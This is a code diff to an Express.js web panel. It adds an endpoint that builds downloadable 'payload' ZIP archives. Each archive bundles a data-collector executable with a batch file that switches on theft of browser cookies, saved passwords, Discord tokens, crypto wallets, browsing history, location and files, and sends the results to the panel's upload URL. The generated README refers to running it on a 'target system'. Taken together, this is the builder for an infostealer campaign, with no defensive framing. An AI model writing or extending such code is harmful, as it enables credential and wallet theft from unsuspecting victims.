@@ -2,6 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
 const { userDb, loginAttemptsDb, logsDb } = require('./database');
@@ -483,7 +484,7 @@ app.post('/api/logs/delete', authenticateToken, (req, res) => {
     try {
         const username = req.user.username;
         const { logIds } = req.body;
-        
+
         if (!Array.isArray(logIds) || logIds.length === 0) {
             return res.status(400).json({ message: 'logIds must be a non-empty array' });
         }
@@ -508,6 +509,117 @@ app.post('/api/logs/delete', authenticateToken, (req, res) => {
     } catch (error) {
         console.error("Error deleting logs:", error);
         res.status(500).json({ message: 'Error deleting logs', error: error.message });
+    }
+});
+
+// Payload generation endpoint
+app.post('/api/payloads/generate', authenticateToken, (req, res) => {
+    try {
+        const username = req.user.username;
+        const { features, user } = req.body;
+
+        if (!features || typeof features !== 'object') {
+            return res.status(400).json({ message: 'features object is required' });
+        }
+
+        // Verify that the user matches the authenticated user
+        if (user && user !== username) {
+            return res.status(403).json({ message: 'Cannot generate payloads for other users' });
+        }
+
+        // Path to the payload executable
+        const payloadPath = path.join(__dirname, '..', 'data_collector.exe');
+
+        // Check if payload exists
+        if (!fs.existsSync(payloadPath)) {
+            return res.status(500).json({ message: 'Payload executable not found. Please build the payload first.' });
+        }
+
+        // Get server URL from environment or construct from request
+        const serverUrl = process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}/api/upload`;
+
+        console.log(`Generating payload for user ${username} with server URL: ${serverUrl}`);
+        console.log(`Selected features:`, features);
+
+        // Create a ZIP archive containing the payload and configuration
+        const archiver = require('archiver');
+        const archive = archiver('zip', {
+            zlib: { level: 9 }
+        });
+
+        // Set response headers
+        res.setHeader('Content-Type', 'application/zip');
+        res.setHeader('Content-Disposition', `attachment; filename="payload_${username}_${Date.now()}.zip"`);
+
+        // Handle archive errors
+        archive.on('error', (err) => {
+            console.error('Archive error:', err);
+            if (!res.headersSent) {
+                res.status(500).json({ message: 'Error creating payload archive', error: err.message });
+            }
+        });
+
+        // Pipe archive data to response
+        archive.pipe(res);
+
+        // Add the executable
+        archive.file(payloadPath, { name: 'payload.exe' });
+
+        // Create environment configuration batch file
+        const envConfig = [
+            '@echo off',
+            `set CLIENT_USER=${username}`,
+            `set WEBPANEL_URL=${serverUrl}`,
+            `set COLLECT_LOCATION=${features.location ? '1' : '0'}`,
+            `set COLLECT_SYSTEM_INFO=${features.systemInfo ? '1' : '0'}`,
+            `set COLLECT_RUNNING_PROCESSES=${features.runningProcesses ? '1' : '0'}`,
+            `set COLLECT_INSTALLED_APPS=${features.installedApps ? '1' : '0'}`,
+            `set COLLECT_BROWSER_COOKIES=${features.browserCookies ? '1' : '0'}`,
+            `set COLLECT_SAVED_PASSWORDS=${features.savedPasswords ? '1' : '0'}`,
+            `set COLLECT_BROWSER_HISTORY=${features.browserHistory ? '1' : '0'}`,
+            `set COLLECT_DISCORD_TOKENS=${features.discordTokens ? '1' : '0'}`,
+            `set COLLECT_CRYPTO_WALLETS=${features.cryptoWallets ? '1' : '0'}`,
+            `set COLLECT_IMPORTANT_FILES=${features.importantFiles ? '1' : '0'}`,
+            '',
+            'echo Starting payload with configuration...',
+            'payload.exe',
+            '',
+            'pause'
+        ].join('\r\n');
+
+        archive.append(envConfig, { name: 'run_payload.bat' });
+
+        // Create a README file with instructions
+        const readme = [
+            'Payload Configuration',
+            '====================',
+            '',
+            `Generated for user: ${username}`,
+            `Server URL: ${serverUrl}`,
+            `Generated at: ${new Date().toISOString()}`,
+            '',
+            'Features enabled:',
+            ...Object.entries(features).map(([key, enabled]) =>
+                `  - ${key}: ${enabled ? 'YES' : 'NO'}`
+            ),
+            '',
+            'To run the payload:',
+            '1. Extract all files to the same directory',
+            '2. Double-click run_payload.bat',
+            '',
+            'The batch file will set the correct environment variables and run the payload.',
+            '',
+            'Note: Make sure the target system allows execution of .exe and .bat files.'
+        ].join('\r\n');
+
+        archive.append(readme, { name: 'README.txt' });
+
+        // Finalize the archive
+        archive.finalize();
+
+    } catch (error) {
+        console.error('Error generating payload:', error);
+        res.status(500).json({ message: 'Internal server error', error: error.message });
     }
 });
 
